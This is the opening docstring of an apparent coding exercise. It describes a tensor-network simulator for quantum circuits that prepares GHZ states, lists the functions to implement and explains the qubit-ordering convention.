"""A basic implementation of a simulator based on tensor networks.

Throughout this exercise, we will be implementing a tensor network simulator for
quantum circuits. This will be used to simulate the creation of GHZ states,
which are generalizations of the Bell states.

The simulator will be based on the following functions:
    create_zero_state(num_qubits)
    create_nearest_neighbor_two_qubit_gate(gate_matrix)
    apply_single_qubit_gate(state, gate, site)
    apply_two_qubit_gate(state, gate, site0, site1)
    get_amplitude(state, bitstring)
    measure_all(state, shots)
    simulate_ghz_state(num_qubits, shots)

Note:
    The qubit ordering is assumed to be q_{N-1} ... q_1 q_0, i.e., the least
    significant qubit is the rightmost one. Any computational basis state |i>
    is represented by the bitstring i in big-endian form. For example, the
    state |100> would be represented by the bitstring '100', i.e., the value 4.
    In that case, q_2 = 1, q_1 = 0, and q_0 = 0.

Important:
    Most of the functions in this file are supplemented with hints and comments
    that explain how to implement them. You should read these carefully.
    Note that in many cases, there might be multiple ways to implement a
    function. The hints and comments are meant to guide you towards a
    particular implementation, but you are free to implement the function
    differently if you want to (as long as the function behaves as specified).
